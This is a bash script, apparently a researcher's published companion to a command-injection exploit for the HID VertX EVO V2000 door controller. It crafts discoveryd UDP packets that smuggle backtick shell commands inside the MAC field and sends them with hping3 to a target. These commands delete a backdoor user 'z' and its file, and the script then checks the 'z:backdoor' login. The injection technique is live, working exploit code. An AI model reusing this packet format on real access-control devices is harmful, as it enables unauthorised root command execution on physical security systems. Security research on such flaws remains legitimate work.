#!/bin/bash
#################################################################################
# Writen by Mike Kelly								#
# twitter.com/lixmk								#
# github.com/lixmk								#
# exfil.co									#
#                                                                               #
#	###########################################################		#
#	# HID Discoveryd clean up script for the VertX EVO V2000  #		#
#	#                                                         #		#
#	#      Removes the 'z' user and removes exploit files     #		#
#	#        created by the VertX2k-exploit.sh script.        #		#
#	###########################################################		#
#										#
#	This program is free software: you can redistribute it and/or modify	#
#	it under the terms of the GNU General Public License as published by	#
#	the Free Software Foundation, either version 3 of the License, or	#
#	at your option) any later version.					#
#										#
#	This program is distributed in the hope that it will be useful,		#
#	but WITHOUT ANY WARRANTY; without even the implied warranty of		#
#	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the		#
#	GNU General Public License for more details.				#
#										#
#	You should have received a copy of the GNU General Public License	#
#	along with this program.  If not, see <http://www.gnu.org/licenses/>. 	#
#										#
#################################################################################

echo -e "\e[1;31m############################################################\e[0m"
echo -e "\e[1;31m#\e[0m                                                          \e[1;31m#\e[0m"
echo -e "\e[1;31m#\e[0m     Cleans up after VertX2k-exploit.sh to remove the     \e[1;31m#\e[0m"
echo -e "\e[1;31m#\e[0m  'z' user and other associated files from exploitation.  \e[1;31m#\e[0m"
echo -e "\e[1;31m#\e[0m                                                          \e[1;31m#\e[0m"
echo -e "\e[1;31m#\e[0m            Variables need to be set manually             \e[1;31m#\e[0m"
echo -e "\e[1;31m#\e[0m    CTRL-C now to set vars or press ENTER to continue.    \e[1;31m#\e[0m"
echo -e "\e[1;31m#\e[0m                                                          \e[1;31m#\e[0m"
echo -e "\e[1;31m############################################################\e[0m"
read -e NULL

# Set the follwoing 2 variables
TARGET='192.168.5.154'
TMAC='00:06:8E:02:54:F2'
# 

CMDEXEC=`which hping3`

echo "[*] Creating Data file"
echo 'command_blink_on;044;'${TMAC}';1`deluser z`;' > cleanup1.txt
echo 'command_blink_on;044;'${TMAC}';1`rm /tmp/z`;' > cleanup2.txt
echo "[*] Data file created"
echo "[*] Executing"

echo "[*] Sending Payload 1"
${CMDEXEC} -2 -p 4070 -c 1 -E cleanup1.txt -d 150 ${TARGET} 2> /dev/null
#sleep 1s	#If first attempt was unsuccessful, uncomment this line
echo ""

echo "[*] Sending Payload 2"
${CMDEXEC} -2 -p 4070 -c 1 -E cleanup2.txt -d 150 ${TARGET} 2> /dev/null
echo ""
echo "[*] Cleanup Attempt complete"
echo "[*] Verify by attempting login http://${TARGET}/ with z:backdoor"
